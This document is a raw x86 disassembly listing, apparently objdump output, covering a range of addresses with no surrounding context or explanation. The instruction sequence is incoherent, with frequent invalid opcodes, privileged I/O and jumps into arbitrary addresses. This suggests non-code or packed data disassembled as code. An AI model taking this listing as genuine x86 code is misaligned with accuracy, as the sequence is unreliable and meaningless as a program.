  415dde:	sub    BYTE PTR [ebx+0x593a0d41],cl
  415de4:	mov    ebx,DWORD PTR [eax]
  415de6:	(bad)  
  415de7:	push   ss
  415de8:	cs push cs
  415dea:	cs push ds
  415dec:	xchg   ecx,eax
  415ded:	(bad)  
  415dee:	pop    ebp
  415def:	gs dec ebx
  415df1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415df2:	jmp    0x52fe3b4d
  415df7:	xlat   BYTE PTR ds:[ebx]
  415df8:	stos   DWORD PTR es:[edi],eax
  415df9:	mov    ?,ebx
  415dfb:	shl    DWORD PTR [ebp-0x51],0xc
  415dff:	fistp  QWORD PTR [ecx]
  415e01:	enter  0x41c7,0xb1
  415e05:	pop    ebp
  415e06:	out    dx,eax
  415e07:	int    0xd2
  415e09:	jne    0x415e15
  415e0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415e0c:	arpl   ax,bp
  415e0e:	jnp    0x415e18
  415e10:	mov    ebp,esi
  415e12:	push   es
  415e13:	out    dx,eax
  415e14:	mov    ah,0x66
  415e16:	jmp    0x661:0x772fd76c
  415e1d:	idiv   BYTE PTR [esi-0x1f948ebb]
  415e23:	mov    ch,BYTE PTR [ecx-0x3f]
  415e26:	in     al,dx
  415e27:	push   es
  415e28:	and    esp,DWORD PTR [ecx+0x17afdd6f]
  415e2e:	icebp  
  415e2f:	push   edi
  415e30:	test   al,0xd0
  415e32:	sahf   
  415e33:	aaa    
  415e34:	sub    al,al
  415e36:	aaa    
  415e37:	adc    DWORD PTR ds:0xd3602dc6,edx
  415e3d:	dec    edi
  415e3e:	pop    esi
  415e3f:	clc    
  415e40:	push   ebx
  415e41:	lods   eax,DWORD PTR ds:[esi]
  415e42:	add    cl,BYTE PTR [eax-0x2b786c00]
  415e48:	dec    ebp
  415e49:	mov    WORD PTR [esi],?
  415e4b:	add    eax,0x338a8440
  415e50:	pop    ebp
  415e51:	not    BYTE PTR [edx-0x2d610769]
  415e57:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415e58:	inc    esp
  415e59:	call   0xf8fc925
  415e5e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415e5f:	repnz sbb DWORD PTR gs:[esp+esi*2+0x1740d9d6],esi
  415e68:	loope  0x415ead
  415e6a:	stos   DWORD PTR es:[edi],eax
  415e6b:	jecxz  0x415e09
  415e6d:	dec    edx
  415e6e:	enter  0x74da,0xca
  415e72:	jl     0x415e57
  415e74:	aaa    
  415e75:	(bad)  
  415e76:	mov    ds:0x2e85cc74,al
  415e7b:	clc    
  415e7c:	add    al,0xb4
  415e7e:	sbb    BYTE PTR [ebp-0x418fbe57],ah
  415e84:	add    ebp,edi
  415e86:	shr    BYTE PTR [edi],cl
  415e88:	xor    bh,BYTE PTR [ecx]
  415e8a:	in     al,0xdb
  415e8c:	fistp  DWORD PTR [bx+di]
  415e8f:	sbb    bl,BYTE PTR [eax-0x40]
  415e92:	scas   eax,DWORD PTR es:[edi]
  415e93:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415e94:	inc    esp
  415e95:	cmp    BYTE PTR [edi+0x1373fea],bh
  415e9b:	pop    ebx
  415e9c:	sbb    ch,BYTE PTR [ebx+0x5a0b9d92]
  415ea2:	mov    ah,0x27
  415ea4:	adc    BYTE PTR [edi+eiz*2-0x20],ah
  415ea8:	cmp    esp,DWORD PTR ss:[ebp+0x1b521b0a]
  415eaf:	sub    eax,0x3489cd5d
  415eb4:	loopne 0x415eeb
  415eb6:	dec    ecx
  415eb7:	mov    edx,0xacd6d3f8
  415ebc:	jns    0x415e6c
  415ebe:	(bad)  [ecx+0x100fb6c7]
  415ec4:	mov    ebx,0xc9d8b667
  415ec9:	rcl    BYTE PTR [esi-0x7b],0x2b
  415ecd:	fbstp  TBYTE PTR [ebx-0x47]
  415ed0:	dec    edx
  415ed1:	inc    esp
  415ed2:	lahf   
  415ed3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415ed4:	loop   0x415f1f
  415ed6:	lahf   
  415ed7:	fld    QWORD PTR [edx-0x13]
  415eda:	or     BYTE PTR [ecx],ch
  415edc:	mov    eax,ds:0x4cb0598c
  415ee1:	add    eax,0xf442e9c5
  415ee6:	repnz out 0xbd,al
  415ee9:	aaa    
  415eea:	pop    edi
  415eeb:	cmp    cl,BYTE PTR [ecx-0x4]
  415eee:	adc    DWORD PTR ds:0xbebc91a3,esp
  415ef4:	xchg   edx,eax
  415ef5:	ret    0x85d8
  415ef8:	and    edx,DWORD PTR [ecx]
  415efa:	sub    eax,0x27302930
  415eff:	mov    eax,0x6b784f61
  415f04:	lds    ebx,FWORD PTR [esi+edi*1-0x62]
  415f08:	(bad)  
  415f09:	cmc    
  415f0a:	aad    0xde
  415f0c:	dec    edi
  415f0d:	mov    ebx,0x16e5c2a4
  415f12:	dec    esi
  415f13:	mov    al,ds:0xcf1772c9
  415f18:	es (bad) 
  415f1a:	and    al,0x37
  415f1c:	cmp    ecx,edx
  415f1e:	dec    edx
  415f1f:	and    eax,0xb32224f8
  415f24:	push   edi
  415f25:	lods   eax,DWORD PTR ds:[esi]
  415f26:	inc    esp
  415f27:	jle    0x415f83
  415f29:	imul   edi,DWORD PTR [edx],0xfe600229
  415f2f:	fsub   st(5),st
  415f31:	cmp    edi,ecx
  415f33:	or     al,0xf1
  415f35:	icebp  
  415f36:	(bad)  
  415f37:	ss push 0x46
  415f3a:	jo     0x415f2f
  415f3c:	sbb    bh,BYTE PTR [ecx]
  415f3e:	nop
  415f3f:	popf   
  415f40:	cmp    al,0x33
  415f42:	xchg   ecx,eax
  415f43:	dec    esp
  415f44:	cdq    
  415f45:	stos   DWORD PTR es:[edi],eax
  415f46:	adc    bh,BYTE PTR [esi]
  415f48:	or     BYTE PTR ds:0xdfa75847,bl
  415f4e:	mov    al,ds:0x4cc4d1ac
  415f53:	or     BYTE PTR [edx],cl
  415f55:	xchg   ecx,eax
  415f56:	test   eax,0x8f727a0a
  415f5b:	cdq    
  415f5c:	cmp    al,0x51
  415f5e:	outs   dx,BYTE PTR ds:[esi]
  415f5f:	mov    ds:0xda684f9b,al
  415f64:	sbb    DWORD PTR [edx],edx
  415f66:	xor    eax,0x8a2dd716
  415f6b:	xor    al,0xd7
  415f6d:	retf   0x35ce
  415f70:	ret    0xb045
  415f73:	sbb    DWORD PTR [edx],ecx
  415f75:	out    0x6c,al
  415f77:	jo     0x415fcb
  415f79:	push   edx
  415f7a:	and    eax,0x343ad950
  415f7f:	lods   eax,DWORD PTR ds:[esi]
  415f80:	dec    esi
  415f81:	jge    0x415f75
  415f83:	outs   dx,DWORD PTR ds:[esi]
  415f84:	mov    edi,0xf68e2307
  415f89:	and    al,0x4a
  415f8b:	stc    
  415f8c:	popf   
  415f8d:	inc    eax
  415f8e:	shl    edi,cl
  415f90:	aas    
  415f91:	into   
  415f92:	stc    
  415f93:	fbld   TBYTE PTR [ebx]
  415f95:	push   edi
  415f96:	mov    edx,0x8a55ffbf
  415f9b:	dec    edx
  415f9c:	mov    esp,0x514c45f2
  415fa1:	xchg   edx,eax
  415fa2:	xchg   edx,eax
  415fa3:	iret   
  415fa4:	pop    edx
  415fa5:	out    dx,al
  415fa6:	xor    bl,BYTE PTR [eax+0xa02a67a]
  415fac:	xchg   ebp,eax
  415fad:	mov    esp,0x40af7ef2
  415fb2:	enter  0x49a0,0x97
  415fb6:	cmp    BYTE PTR [edx],cl
  415fb8:	loope  0x415f42
  415fba:	xchg   DWORD PTR [esi+0x2b],ebp
  415fbd:	sar    DWORD PTR [edx-0x31],cl
  415fc0:	lods   al,BYTE PTR ds:[esi]
  415fc1:	xor    DWORD PTR [edx*2+0x2fb8db8],esp
  415fc8:	inc    ebx
  415fc9:	sbb    ebp,ecx
  415fcb:	cmp    ebp,DWORD PTR [ecx]
  415fcd:	push   eax
  415fce:	or     ebx,DWORD PTR [edi-0x728d84be]
  415fd4:	add    ch,ch
  415fd6:	or     al,BYTE PTR [eax]
  415fd8:	jb     0x415f5c
  415fda:	das    
  415fdb:	mov    esp,0xff0ec26
  415fe0:	std    
  415fe1:	pop    ss
  415fe2:	(bad)  
  415fe3:	shr    DWORD PTR [ebp+0x51],0xc3
  415fe7:	sbb    ah,al
  415fe9:	cmp    ch,bl
  415feb:	repz push 0x3c
  415fee:	jb     0x415fe7
  415ff0:	jge    0x41602c
  415ff2:	pop    edi
  415ff3:	outs   dx,DWORD PTR ds:[esi]
  415ff4:	mov    ah,0x86
  415ff6:	stos   BYTE PTR es:[edi],al
  415ff7:	stc    
  415ff8:	daa    
  415ff9:	je     0x416005
  415ffb:	mov    bl,0xee
  415ffd:	cs and eax,0xb7fb997d
  416003:	xchg   esp,eax
  416004:	mov    eax,ds:0x10fae843
  416009:	pop    esi
  41600a:	jno    0x415fd2
  41600c:	hlt    
  41600d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41600e:	sub    BYTE PTR [edi-0x27571af6],0x15
  416015:	mov    ds:0x5f806388,eax
  41601a:	mov    edi,0x60e4b403
  41601f:	inc    edi
  416020:	mov    esi,0xd2ab9cbe
  416025:	ret    
  416026:	int3   
  416027:	dec    ebp
  416028:	out    dx,al
  416029:	pop    esi
  41602a:	cmp    eax,0x288812e8
  41602f:	mov    DWORD PTR [eax],eax
  416031:	fcomp  QWORD PTR [ebx+eiz*2-0x50]
  416035:	lock mov al,ds:0x826168d
  41603b:	push   cs
  41603c:	arpl   ax,bp
  41603e:	leave  
  41603f:	add    edx,DWORD PTR [esi-0x6f]
  416042:	sahf   
  416043:	mov    ch,cl
  416045:	and    DWORD PTR [esi+0x48d4327e],0x91be9ead
  41604f:	adc    ah,BYTE PTR [edi+0x371b0705]
  416055:	fwait
  416056:	or     bh,bh
  416058:	leave  
  416059:	shl    DWORD PTR cs:0x7ca7d005,cl
  416060:	sbb    ah,bl
  416062:	add    BYTE PTR [edx+0x24],0xa8
  416066:	pop    ss
  416067:	adc    al,0xe
  416069:	mov    bh,0x2
  41606b:	aas    
  41606c:	cdq    
  41606d:	mov    dl,0xb1
  41606f:	pop    ds
  416070:	jns    0x41602f
  416072:	sbb    esi,edx
  416074:	in     al,0x2a
  416076:	daa    
  416077:	out    dx,al
  416078:	stc    
  416079:	add    BYTE PTR [edi+0x751919c],dl
  41607f:	mov    ch,0x44
  416081:	mov    dl,0xb7
  416083:	adc    BYTE PTR [ecx+edx*2-0xd],bh
  416087:	push   ds
  416088:	bound  eax,QWORD PTR [eax-0x2d]
  41608b:	xlat   BYTE PTR ds:[ebx]
  41608c:	jg     0x4160ba
  41608e:	fiadd  WORD PTR [ebp-0x725b52da]
  416094:	push   ds
  416095:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416096:	xor    ch,BYTE PTR [esp+eiz*8-0x7d4f9d6f]
  41609d:	and    bh,dl
  41609f:	enter  0x10db,0xa6
  4160a3:	dec    edi
  4160a4:	not    bl
  4160a6:	push   es
  4160a7:	jae    0x41608f
  4160a9:	sbb    DWORD PTR [ebx],eax
  4160ab:	cdq    
  4160ac:	int    0x81
  4160ae:	loopne 0x416052
  4160b0:	or     dh,BYTE PTR [eax]
  4160b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4160b3:	out    0x20,eax
  4160b5:	sbb    cl,BYTE PTR es:[ecx+0x1c]
  4160b9:	add    esi,DWORD PTR [esi+0x7c3b900c]
  4160bf:	sbb    eax,0x646c07cd
  4160c4:	or     ecx,DWORD PTR [eax-0x65cf02ca]
  4160ca:	pop    ds
  4160cb:	inc    ecx
  4160cc:	jg     0x4160c0
  4160ce:	add    ebp,DWORD PTR [eax]
  4160d0:	sbb    edi,esp
  4160d2:	mov    eax,ds:0xf511fc2
  4160d7:	ja     0x41611d
  4160d9:	rcl    BYTE PTR [eax],cl
  4160db:	das    
  4160dc:	fucomip st,st(7)
  4160de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4160df:	scas   eax,DWORD PTR es:[edi]
  4160e0:	xchg   edx,eax
  4160e1:	dec    edi
  4160e2:	out    0x3d,eax
  4160e4:	out    dx,al
  4160e5:	dec    ebp
  4160e6:	(bad)  
  4160e7:	stc    
  4160e8:	jne    0x4160c9
  4160ea:	xor    BYTE PTR [ebp+0x29],ch
  4160ed:	ds xor al,0x47
  4160f0:	inc    ebp
  4160f1:	xlat   BYTE PTR ds:[ebx]
  4160f2:	stc    
  4160f3:	test   DWORD PTR [ebx+0x531ce105],eax
  4160f9:	repnz add ebx,0xa545d81c
  416100:	clc    
  416101:	retf   
  416102:	dec    edx
  416103:	mov    ah,0xf2
  416105:	pushf  
  416106:	sbb    DWORD PTR [ebx+0x5da2d49c],ecx
  41610c:	push   eax
  41610d:	lds    ebx,FWORD PTR [ecx+0x1f816e35]
  416113:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416114:	mov    dh,BYTE PTR [ebx]
  416116:	mov    eax,0xaef5922a
  41611b:	mov    ds:0x18bb1e14,eax
  416120:	out    dx,eax
  416121:	cmp    DWORD PTR [edi],edx
  416123:	je     0x416149
  416125:	sar    BYTE PTR [ebx+0x42b0c3a4],0x7
  41612c:	data16 jl 0x4160dc
  41612f:	pop    ebp
  416130:	and    DWORD PTR [ecx],edx
  416132:	lods   eax,DWORD PTR ds:[esi]
  416133:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416134:	scas   al,BYTE PTR es:[edi]
  416135:	jp     0x416137
  416137:	addr16 out 0xc3,eax
  41613a:	sub    BYTE PTR ds:0x40e3450a,dh
  416140:	adc    DWORD PTR [eax-0x700c1806],ecx
  416146:	idiv   DWORD PTR [esi+0x77ac9ecd]
  41614c:	leave  
  41614d:	gs pop eax
  41614f:	xchg   ebx,eax
  416150:	dec    esp
  416151:	ret    
  416152:	cmp    al,0xa8
  416154:	daa    
  416155:	fwait
  416156:	add    dl,BYTE PTR [eax+esi*8+0x11]
  41615a:	nop
  41615b:	inc    esp
  41615c:	and    ebx,DWORD PTR [esi-0x52]
  41615f:	sub    eax,0x4ccb9412
  416164:	sub    eax,0x28005cfb
  416169:	aam    0x88
  41616b:	xchg   esi,eax
  41616c:	sahf   
  41616d:	add    esp,ecx
  41616f:	push   0x69ddd944
  416174:	push   0x67
  416176:	pushf  
  416177:	cmp    DWORD PTR [eax],eax
  416179:	test   al,0x2d
  41617b:	inc    edi
  41617c:	ret    
  41617d:	js     0x41615d
  41617f:	imul   ebp,DWORD PTR [eax+0x1b],0x6e
  416183:	pop    es
  416184:	(bad)  
  416185:	imul   ebp,DWORD PTR [ebx-0x4a],0x55
  416189:	dec    ebp
  41618a:	cmp    ebx,DWORD PTR [eax+0x67]
  41618d:	adc    DWORD PTR [eax+0x52],esi
  416190:	arpl   WORD PTR [edx*4-0x2c902bcf],bx
  416197:	mov    bl,0x4b
  416199:	mov    ebx,0x6590c458
  41619e:	and    al,0x7e
  4161a0:	nop
  4161a1:	aas    
  4161a2:	daa    
  4161a3:	add    dh,ch
  4161a5:	adc    eax,0x4e798807
  4161aa:	enter  0x33a7,0x9f
  4161ae:	stc    
  4161af:	cmp    ch,BYTE PTR [eax-0x23]
  4161b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4161b3:	aas    
  4161b4:	aam    0x51
  4161b6:	push   esi
  4161b7:	or     al,0x38
  4161b9:	or     ch,BYTE PTR [eax+0x4f]
  4161bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4161bd:	xchg   ebx,eax
  4161be:	fidivr WORD PTR [esi+ebx*1]
  4161c1:	pop    ebp
  4161c2:	in     al,dx
  4161c3:	mov    al,BYTE PTR [edx-0x710f7249]
  4161c9:	mov    ecx,0x71e6eca6
  4161ce:	push   edi
  4161cf:	pop    edi
  4161d0:	inc    esi
  4161d1:	adc    ah,BYTE PTR [ecx]
  4161d3:	(bad)  
  4161d7:	nop
  4161d8:	call   0xeac4ddc4
  4161dd:	sahf   
  4161de:	pop    ebp
  4161df:	pop    eax
  4161e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4161e1:	mov    edx,edi
  4161e3:	mov    esi,0x48d0593e
  4161e8:	out    0x4f,eax
  4161ea:	shl    BYTE PTR [edi+0x938f0db],0x9
  4161f1:	and    eax,0xed2a15fe
  4161f6:	mov    al,ds:0x20b86d86
  4161fb:	enter  0xb60f,0x51
  4161ff:	stos   BYTE PTR es:[edi],al
  416200:	sub    BYTE PTR [ecx],0xe5
  416203:	xor    bl,bl
  416205:	xor    al,0x46
  416207:	jns    0x4161a9
  416209:	fs (bad) 
  41620c:	test   ch,0xf9
  41620f:	jle    0x416240
  416211:	sbb    al,0xc9
  416213:	sbb    al,0xf7
  416215:	ret    0x6085
  416218:	mov    dh,0x52
  41621a:	jb     0x4161ac
  41621c:	mov    edi,DWORD PTR [edi+0x25]
  41621f:	cmp    BYTE PTR [edi+edi*8],ah
  416222:	pop    ecx
  416223:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416224:	fbld   TBYTE PTR [edx-0x6802048a]
  41622a:	inc    edi
  41622b:	mov    ds:0xb741a2d3,al
  416230:	in     eax,0x90
  416232:	push   ss
  416233:	pop    ebx
  416234:	out    dx,al
  416235:	loop   0x4161ff
  416237:	(bad)  
  416238:	jnp    0x416256
  41623a:	xor    cl,BYTE PTR [eax-0x36]
  41623d:	cmp    BYTE PTR [ecx],al
  41623f:	sbb    bl,BYTE PTR [ebp-0x3e]
  416242:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416243:	push   ebx
  416244:	mov    eax,0xc535cd20
  416249:	inc    edi
  41624a:	leave  
  41624b:	sti    
  41624c:	fild   DWORD PTR [edi-0x598d55cf]
  416252:	xchg   DWORD PTR [edx+ecx*1-0x601ea5b3],ebp
  416259:	lea    ecx,[esi-0x3a]
  41625c:	mov    ebx,0xfabea24f
  416261:	sar    ebx,0xb5
  416264:	and    ch,BYTE PTR [edx-0x2]
  416267:	add    ah,al
  416269:	inc    esi
  41626a:	ds jno 0x416210
  41626d:	add    al,0x3
  41626f:	call   0x80778394
  416274:	mov    edi,0xfdc3fc22
  416279:	xchg   edx,eax
  41627a:	cdq    
  41627b:	xchg   edx,eax
  41627c:	push   cs
  41627d:	not    BYTE PTR [eax+0x59df5b4a]
  416283:	ret    0x2957
  416286:	mov    ebx,0xe480e717
  41628b:	mov    DWORD PTR [esi],0xf4b0485d
  416291:	jmp    0x4162c2
  416293:	aad    0xc4
  416295:	inc    esi
  416296:	cld    
  416297:	inc    edx
  416298:	sahf   
  416299:	xchg   BYTE PTR [edi+0x2116e9b2],cl
  41629f:	jmp    0x4162d7
  4162a1:	push   ecx
  4162a2:	mov    dl,bh
  4162a4:	xor    ch,BYTE PTR [eax-0x3a]
  4162a7:	mov    edi,0x116ebadc
  4162ac:	jae    0x4162d9
  4162ae:	or     edx,DWORD PTR [edx-0x39]
  4162b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4162b2:	jnp    0x416283
  4162b4:	push   edi
  4162b5:	push   ds
  4162b6:	adc    al,0xea
  4162b8:	push   edi
  4162b9:	ins    BYTE PTR es:[edi],dx
  4162ba:	adc    BYTE PTR [edx],dh
  4162bc:	js     0x4162b3
  4162be:	in     al,dx
  4162bf:	fldenv [ebx-0x30]
  4162c2:	ret    
  4162c3:	scas   al,BYTE PTR es:[edi]
  4162c4:	dec    eax
  4162c5:	les    ebx,FWORD PTR [ebx-0x25]
  4162c8:	sub    edx,0xffffff94
  4162cb:	mov    gs,ecx
  4162cd:	lods   eax,DWORD PTR ds:[esi]
  4162ce:	arpl   WORD PTR [ecx-0x4b3b6634],cx
  4162d4:	jp     0x41632e
  4162d6:	jno    0x416319
  4162d8:	je     0x416319
  4162da:	sbb    ch,BYTE PTR [ebx+0x64]
  4162dd:	enter  0x9499,0xc
  4162e1:	mov    ecx,0x5a469709
  4162e6:	sbb    BYTE PTR [ecx+0x6d],ch
  4162e9:	lahf   
  4162ea:	sub    al,0xa0
  4162ec:	sub    ah,bl
  4162ee:	aaa    
  4162ef:	xor    al,0x4a
  4162f1:	mov    ah,BYTE PTR [esi-0xe]
  4162f4:	lock sbb al,dl
  4162f7:	push   0xa51a74a5
  4162fc:	test   DWORD PTR [eax],ecx
  4162fe:	jo     0x416319
  416300:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416301:	cs pop ebx
  416303:	in     eax,0x30
  416305:	xor    BYTE PTR [edx+eax*8+0x16],0xaa
  41630a:	enter  0x8c2e,0x62
  41630e:	cmp    al,0x6
  416310:	dec    esp
  416311:	jge    0x416375
  416313:	mov    edx,0x703d458e
  416318:	or     ah,BYTE PTR [eax]
  41631a:	sub    DWORD PTR [esi+0x329e0a0b],ebp
  416320:	fdivr  QWORD PTR [ecx+0x3d]
  416323:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416324:	aaa    
  416325:	or     ebp,esp
  416327:	loopne 0x41638a
  416329:	in     al,0xd
  41632b:	ss test eax,0x1b9c5d34
  416331:	sar    BYTE PTR [edx],cl
  416333:	out    dx,al
  416334:	mov    esi,0x50398cc6
  416339:	dec    ebx
  41633a:	or     ebp,esp
  41633c:	lds    esp,FWORD PTR [ebp+0x3cfd8a63]
  416342:	jns    0x4162d2
  416344:	into   
  416345:	cli    
  416346:	dec    esi
  416347:	cli    
  416348:	pop    ds
  416349:	mov    al,cl
  41634b:	int3   
  41634c:	dec    ecx
  41634d:	dec    esp
  41634e:	sbb    edi,0xf8c6be84
  416354:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416355:	stc    
  416356:	sub    al,0xe2
  416358:	mov    al,0x6c
  41635a:	mov    al,ds:0x4651175c
  41635f:	(bad)  
  416360:	jle    0x416372
  416362:	jmp    DWORD PTR [eax-0x73]
  416365:	jae    0x416343
  416367:	scas   al,BYTE PTR es:[edi]
  416368:	ror    cl,0x7b
  41636b:	bound  edi,QWORD PTR [ebp+ecx*8+0x5f]
  41636f:	pop    esi
  416370:	popa   
  416371:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416372:	cmc    
  416373:	mov    dl,BYTE PTR ds:0xcab4c8e8
  416379:	add    al,0x79
  41637b:	js     0x4163eb
  41637d:	inc    ecx
  41637e:	xchg   ecx,eax
  41637f:	or     eax,0xbbedbbd9
  416384:	xchg   edx,eax
  416385:	sahf   
  416386:	push   0x3d03668b
  41638b:	outs   dx,DWORD PTR ds:[esi]
  41638c:	dec    esp
  41638d:	mov    cl,0x3
  41638f:	cmp    cl,cl
  416391:	pop    edi
  416392:	mov    ds:0xdf49d63b,eax
  416397:	es cmp eax,0x8fae1a5e
  41639d:	mov    esp,0xa3aac4e3
  4163a2:	ficom  WORD PTR [edx]
  4163a4:	mul    BYTE PTR [edx-0x1c]
  4163a7:	sbb    eax,0x23a2b81
  4163ac:	icebp  
  4163ad:	xor    eax,0x40e6dbaf
  4163b2:	jge    0x41640c
  4163b4:	rol    DWORD PTR [ebp+0x61e77e29],cl
  4163ba:	xor    eax,0x7cbc43da
  4163bf:	(bad)  
  4163c0:	retf   0xd4c5
  4163c3:	dec    DWORD PTR [ecx]
  4163c5:	(bad)  
  4163c6:	popa   
  4163c7:	fucomip st,st(6)
  4163c9:	pop    esi
  4163ca:	scas   al,BYTE PTR es:[edi]
  4163cb:	cs ret 0x3262
  4163cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4163d0:	inc    esi
  4163d1:	clc    
  4163d2:	loopne 0x41637b
  4163d4:	mov    esp,0xdf7f8a61
  4163d9:	(bad)  
  4163da:	pop    esi
  4163db:	data16 jmp 0x416366
  4163de:	mov    cs,WORD PTR [edi+0x7bc1d7d3]
  4163e4:	push   es
  4163e5:	mov    edi,0x78c07845
  4163ea:	sub    ebx,eax
  4163ec:	sub    BYTE PTR [esi],al
  4163ee:	inc    edi
  4163ef:	sbb    BYTE PTR [ecx+0xea005e],al
  4163f5:	inc    ebx
  4163f6:	fmul   DWORD PTR ds:0xf52f2858
  4163fc:	inc    eax
  4163fd:	and    dl,al
  4163ff:	adc    BYTE PTR [edx-0x62],cl
  416402:	push   0x51
  416404:	and    DWORD PTR ds:0x544fee4e,ebp
  41640a:	addr16 loopne 0x416475
  41640d:	mov    edi,0x28937b98
  416412:	push   ss
  416413:	cmp    DWORD PTR [eax-0x24],esi
  416416:	add    BYTE PTR [edx+0x19926697],bh
  41641c:	test   ebx,0x403ce9bb
  416422:	mov    ebp,DWORD PTR [ecx]
  416424:	lods   eax,DWORD PTR ds:[esi]
  416425:	jns    0x41646d
  416427:	hlt    
  416428:	(bad)  
  41642a:	and    eax,0x31fde570
  41642f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416430:	xchg   edi,eax
  416431:	and    DWORD PTR [ebx-0x47],eax
  416434:	clc    
  416435:	dec    edx
  416436:	neg    BYTE PTR [ebx]
  416438:	cmp    BYTE PTR [esi],bh
  41643a:	popa   
  41643b:	or     al,0xfe
  41643d:	push   esp
  41643e:	imul   edx,ecx,0xffffff8f
  416441:	cdq    
  416442:	scas   eax,DWORD PTR es:[edi]
  416443:	ror    DWORD PTR cs:[edi],0x11
  416447:	aas    
  416448:	xchg   ecx,eax
  416449:	in     al,0x95
  41644b:	repz pop ecx
  41644d:	push   cs
  41644e:	jne    0x416497
  416450:	xchg   DWORD PTR [edx],esp
  416452:	aas    
  416453:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416454:	mov    bl,0x4f
  416456:	mov    al,ds:0x2d5a7e2c
  41645b:	inc    ebx
  41645c:	jnp    0x41641f
  41645e:	pop    edx
  41645f:	mov    bl,BYTE PTR [esp+ebx*2]
  416462:	inc    ecx
  416463:	push   edx
  416464:	ror    DWORD PTR [ebp+0x34],0x66
  416468:	loop   0x4163ff
  41646a:	jle    0x4164db
  41646c:	je     0x4164b5
  41646e:	and    al,0x51
  416470:	retf   0x4cae
  416473:	fimul  WORD PTR [edx+eiz*2+0x7c]
  416477:	test   eax,0x4b7de7
  41647c:	mov    bl,0xa1
  41647e:	push   ds
  41647f:	(bad)  
  416481:	xchg   ebx,eax
  416482:	lds    esi,FWORD PTR [eax]
  416484:	(bad)  
  416485:	jae    0x4164e1
  416487:	cs loope 0x416423
  41648a:	xor    ch,BYTE PTR [ebx]
  41648c:	cmp    al,0x32
  41648e:	sub    BYTE PTR [ebx],0xb3
  416491:	mov    dh,0x55
  416493:	jl     0x4164c5
  416495:	call   0xb58337e7
  41649a:	jmp    0x6ee9fb97
  41649f:	push   ds
  4164a0:	js     0x41644e
  4164a2:	mov    ch,0x4
  4164a4:	jmp    0x9e26:0x18552a73
  4164ab:	pusha  
  4164ac:	pop    ebx
  4164ad:	(bad)  
  4164ae:	mov    ecx,0x93798191
  4164b3:	scas   eax,DWORD PTR es:[edi]
  4164b4:	sbb    eax,0x3efece7a
  4164b9:	xchg   ebx,eax
  4164ba:	xchg   esi,eax
  4164bb:	xchg   ebx,eax
  4164bc:	and    al,0x27
  4164be:	ds cld 
  4164c0:	mov    al,ah
  4164c2:	jle    0x4164aa
  4164c4:	push   ebx
  4164c5:	ret    
  4164c6:	mov    al,0x18
  4164c8:	pop    ebx
  4164c9:	mov    eax,0xff445387
  4164ce:	mov    eax,ds:0x4551ef25
  4164d3:	push   edi
  4164d4:	(bad)  
  4164d5:	sub    al,0xbc
  4164d7:	lahf   
  4164d8:	in     al,0x3d
  4164da:	cmp    dl,BYTE PTR [ebx-0x35bd9a3c]
  4164e0:	mov    esp,0xb3c5bda4
  4164e5:	clc    
  4164e6:	cmc    
  4164e7:	pop    ss
  4164e8:	pusha  
  4164e9:	xchg   DWORD PTR [eax],esp
  4164eb:	(bad)  
  4164ed:	out    dx,al
  4164ee:	js     0x4164a9
  4164f0:	add    cl,dl
  4164f2:	je     0x4164b3
  4164f4:	adc    ch,dh
  4164f6:	in     eax,0x56
  4164f8:	shl    DWORD PTR [ecx+0x10a5342f],cl
  4164fe:	sub    edx,eax
  416500:	das    
  416501:	sub    BYTE PTR [ecx],cl
  416503:	mov    fs,WORD PTR [edx+esi*4-0x3842b303]
  41650a:	inc    ebp
  41650b:	xor    DWORD PTR [eax+ebx*8],esp
  41650e:	aas    
  41650f:	and    eax,0xdaefbd4
  416514:	leave  
  416515:	push   cs
  416516:	es in  eax,dx
  416518:	dec    eax
  416519:	loopne 0x4164f7
  41651b:	rcr    DWORD PTR [edi],cl
  41651d:	(bad)  
  41651e:	mov    esi,0x84bd845b
  416523:	xchg   ecx,eax
  416524:	and    eax,0xb7599eec
  416529:	push   ds
  41652a:	push   ss
  41652b:	call   0xd4b8041a
  416530:	or     ax,0x54af
  416534:	fnstenv [eax+edi*4-0xf]
  416538:	sbb    eax,0xaf2b4e5b
  41653d:	sub    al,0xf8
  41653f:	ss jl  0x416590
  416542:	mov    eax,0xa1af1e62
  416547:	scas   eax,DWORD PTR es:[edi]
  416548:	lea    esi,[esi+0x63]
  41654b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41654c:	hlt    
  41654d:	mov    ds,WORD PTR [ebx-0x14]
  416550:	sub    al,BYTE PTR [edi]
  416552:	(bad)  
  416553:	pop    esi
  416554:	mov    edx,0xcc3cb852
  416559:	pop    ss
  41655a:	jmp    0x416506
  41655c:	jmp    0x39405d72
  416561:	mov    ds:0x6d3931c0,eax
  416566:	int    0x0
  416568:	mov    ah,cl
  41656a:	cmp    BYTE PTR [ecx+0x39c95ac],0x63
  416571:	es jno 0x4165d6
  416574:	sub    ch,dl
  416576:	xchg   edx,eax
  416577:	mov    al,0x43
  416579:	shr    BYTE PTR [ebx],1
  41657b:	iret   
